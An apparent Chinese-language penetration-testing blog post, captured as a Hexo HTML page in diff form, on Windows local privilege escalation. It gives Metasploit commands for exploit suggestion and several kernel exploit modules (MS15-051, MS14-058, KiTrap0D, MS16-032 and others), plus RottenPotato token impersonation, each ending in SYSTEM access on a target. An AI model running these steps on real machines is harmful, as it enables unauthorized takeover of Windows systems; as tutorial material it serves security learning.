@@ -1,0 +1,999 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Windows-Exploit-suggesterMetasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。虽说如此，但也并非所有列出的local exploits都可用。所以，无论是漏洞利用还是查找最好的办法就是自动结合手动">
+<meta name="keywords" content="privilege">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内核提权">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/16/2019-1-16-内核提权/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Windows-Exploit-suggesterMetasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。虽说如此，但也并非所有列出的local exploits都可用。所以，无论是漏洞利用还是查找最好的办法就是自动结合手动">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801740_5b99bbcce7873.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801763_5b99bbe333e8f.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801776_5b99bbf02921f.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801792_5b99bc00807a0.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801808_5b99bc10bfd98.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801825_5b99bc210f0ea.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801843_5b99bc331ae66.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801864_5b99bc481849a.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801880_5b99bc5885db8.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801914_5b99bc7abe537.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180913/1536801946_5b99bc9a9b523.png!small">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.239Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内核提权">
+<meta name="twitter:description" content="Windows-Exploit-suggesterMetasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。虽说如此，但也并非所有列出的local exploits都可用。所以，无论是漏洞利用还是查找最好的办法就是自动结合手动">
+<meta name="twitter:image" content="https://image.3001.net/images/20180913/1536801740_5b99bbcce7873.png!small">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/16/2019-1-16-内核提权/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>内核提权 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/16/2019-1-16-内核提权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">内核提权
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-16 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-16T00:00:00+08:00">2019-01-16</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.4k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h2 id="Windows-Exploit-suggester"><a href="#Windows-Exploit-suggester" class="headerlink" title="Windows-Exploit-suggester"></a><strong>Windows-Exploit-suggester</strong></h2><p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。虽说如此，但也并非所有列出的local exploits都可用。所以，无论是漏洞利用还是查找最好的办法就是自动结合手动。</p>
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h3><p><strong>注：</strong>要使用local exploit suggester，我们必须已在目标机器上获取到了一个Meterpreter session。在运行Local Exploit suggester之前，我们需要将现有的Meterpreter session调到后台运行（CTRL + Z）</p>
+<p>示例，假设我们现在有一个Meterpreter session 1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示，它自动的为我们匹配出了一些可能的用于易受攻击目标提权的漏洞利用模块。</p>
+<h2 id><a href="#" class="headerlink" title></a><strong><img src="https://image.3001.net/images/20180913/1536801740_5b99bbcce7873.png!small" alt="Windows内核漏洞利用提权教程"></strong></h2><h2 id="Windows-ClientCopyImage-Win32k-Exploit"><a href="#Windows-ClientCopyImage-Win32k-Exploit" class="headerlink" title="Windows ClientCopyImage Win32k Exploit"></a><strong>Windows ClientCopyImage Win32k Exploit</strong></h2><p>Windows内核模式驱动程序特权提升漏洞。此模块利用了win32k.sys内核模式驱动程序中的不正确对象处理进行提权。</p>
+<p>该模块已在Windows 7 x64和x86，Windows 2008 R2 SP1 x64的易受攻击版本上进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms15_051_client_copy_image</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801763_5b99bbe333e8f.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="Windows-TrackPopupMenu-Win32k-NULL指针解引用"><a href="#Windows-TrackPopupMenu-Win32k-NULL指针解引用" class="headerlink" title="Windows TrackPopupMenu Win32k NULL指针解引用"></a><strong>Windows TrackPopupMenu Win32k NULL指针解引用</strong></h2><p>此模块利用了win32k.sys中的NULL指针解引用，漏洞可通过TrackPopupMenu函数进行触发。在特殊情况下，我们可以滥用在xxxSendMessageTimeout上的NULL指针解引用，来实现任意代码执行操作。</p>
+<p>该模块已在Windows XP SP3，Windows Server 2003 SP2，Windows 7 SP1 Windows Server 2008 32位和Windows Server 2008 R2 SP1 64位上进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms14_058_track_popup_menu</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801776_5b99bbf02921f.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="通过KiTrap0D提升Windows权限"><a href="#通过KiTrap0D提升Windows权限" class="headerlink" title="通过KiTrap0D提升Windows权限"></a>通过KiTrap0D提升Windows权限</h2><p>此模块将通过KiTrap0D exploit创建具有SYSTEM权限的新会话，如果当前使用的会话权限已提升，则exploit将不会运行。该模块依赖于kitrap0d.x86.dll，因此在x64版本的Windows上不受支持。</p>
+<p>该模块已在32位的Windows Server 2003，Windows Server 2008，Windows 7和XP易受攻击版本上进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms10_015_kitrap0d</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801792_5b99bc00807a0.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="Task-Scheduler-XML提权"><a href="#Task-Scheduler-XML提权" class="headerlink" title="Task Scheduler XML提权"></a><strong>Task Scheduler XML提权</strong></h2><p>此漏洞发生在Task Scheduler中，可允许用户提升权限。如果攻击者登录到受影响的系统，并运行特制应用程序，则该漏洞可能允许特权提升。攻击者必须拥有有效的登录凭据，并且能够在本地登录才能成功利用此漏洞。远程或匿名用户则无法利用此漏洞。</p>
+<p>该模块已在Windows Vista，Windows 7，Windows Server 2008 x64和x86的易受攻击版本上进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms10_092_schelevator</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801808_5b99bc10bfd98.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="MS16-016-mrxdav-sys-WebDav本地提权"><a href="#MS16-016-mrxdav-sys-WebDav本地提权" class="headerlink" title="MS16-016 mrxdav.sys WebDav本地提权"></a><strong>MS16-016 mrxdav.sys WebDav本地提权</strong></h2><p>此模块利用了mrxdav.sys中的漏洞。其将在目标系统生成一个进程，并在执行payload之前将其权限提升到NT AUTHORITY\SYSTEM。</p>
+<p>该模块已在Windows 7 SP1，x86架构的易受攻击版本上进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms16_016_webdav</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801825_5b99bc210f0ea.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="EPATHOBJ-pprFlattenRec本地提权"><a href="#EPATHOBJ-pprFlattenRec本地提权" class="headerlink" title="EPATHOBJ::pprFlattenRec本地提权"></a><strong>EPATHOBJ::pprFlattenRec本地提权</strong></h2><p>此模块利用了EPATHOBJ :: pprFlattenRec上的漏洞，其主要问题出在使用了未初始化的数据（即允许损坏内存）。</p>
+<p>目前，该模块已在Windows XP SP3，Windows 2003 SP1和Windows 7 SP1上成功进行了测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ppr_flatten_rec</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801843_5b99bc331ae66.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="MS13-053-NTUserMessageCall-Win32k内核池溢出"><a href="#MS13-053-NTUserMessageCall-Win32k内核池溢出" class="headerlink" title="MS13-053 : NTUserMessageCall Win32k内核池溢出"></a><strong>MS13-053 : NTUserMessageCall Win32k内核池溢出</strong></h2><p>Win32k中的内核池溢出漏洞，可允许本地用户提权。内核shellcode使winlogon.exe进程的ACL为NULL（SYSTEM进程）。这将允许任何非特权进程自由迁移到winlogon.exe，从而提升用户权限。注意：退出meterpreter会话时，可能会导致winlogon.exe崩溃。</p>
+<p>目前，该模块已在Windows 7 SP1 x86上成功测试。</p>
+<p>让我们转到MSF控制台并执行该漏洞的exploit模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms13_053_ schlamperei</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.107</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801864_5b99bc481849a.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="MS16-032-Secondary-Logon-Handle提权"><a href="#MS16-032-Secondary-Logon-Handle提权" class="headerlink" title="MS16-032 Secondary Logon Handle提权"></a><strong>MS16-032 Secondary Logon Handle提权</strong></h2><p>此模块利用了Windows Secondary Logon Service中缺少标准句柄过滤的问题。该漏洞主要影响Windows 7-10和2k8-2k12 32/64位版本。此模块仅适用于具有Powershell 2.0或更高版本的Windows系统，以及具有至少两个或以上CPU内核的系统。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/ms16_032_secondary_logon_handle_privesc</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>一旦exploit成功执行，就会打开另一个Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p><strong><img src="https://image.3001.net/images/20180913/1536801880_5b99bc5885db8.png!small" alt="Windows内核漏洞利用提权教程"></strong></p>
+<h2 id="RottenPotato"><a href="#RottenPotato" class="headerlink" title="RottenPotato"></a><strong>RottenPotato</strong></h2><p>使用RottenPotato将服务帐户本地提权至SYSTEM。</p>
+<p>首先，我们在meterpreter会话中使用以下选项查看当前系统上是否存在任何有效tokens。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_token -u</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，当前并没有任何token可用。</p>
+<p><a href="https://image.3001.net/images/20180913/1536801914_5b99bc7abe537.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180913/1536801914_5b99bc7abe537.png!small" alt="Windows内核漏洞利用提权教程"></a></p>
+<p>现在，我们从github下载Rottenpotato<strong>。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/foxglovesec/RottenPotato.git</span><br><span class="line"><span class="built_in">cd</span> RottenPotato</span><br></pre></td></tr></table></figure>
+
+<p>下载完成后我们会在Rottenpotato目录下，看到一个rottenpotato.exe文件。</p>
+<p>将该文件上传至受害者机器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/Desktop/RottenPotato/rottenpotato.exe .</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180913/1536801946_5b99bc9a9b523.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180913/1536801946_5b99bc9a9b523.png!small" alt="Windows内核漏洞利用提权教程"></a></p>
+<p>然后，键入以下命令执行该exe文件，并将SYSTEM token添加到impersonate user tokens下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute -Hc -f rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们当前的用户权限已提升为了<strong>NT AUTHORITY\SYSTEM</strong></p>
+<p>reference：<br><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
+<p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<p><a href="http://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/" target="_blank" rel="noopener">hackingarticles</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/16/2019-1-16-内核提权/" title="内核提权">https://wh0ale.github.io/2019/01/16/2019-1-16-内核提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/privilege/" rel="tag"><i class="fa fa-tag"></i># privilege</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/16/2019-1-16-搜索引擎tips/" rel="next" title="搜索引擎tips">
+                <i class="fa fa-chevron-left"></i> 搜索引擎tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/16/2019-1-16-挖矿脚本/" rel="prev" title="挖矿脚本">
+                挖矿脚本 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
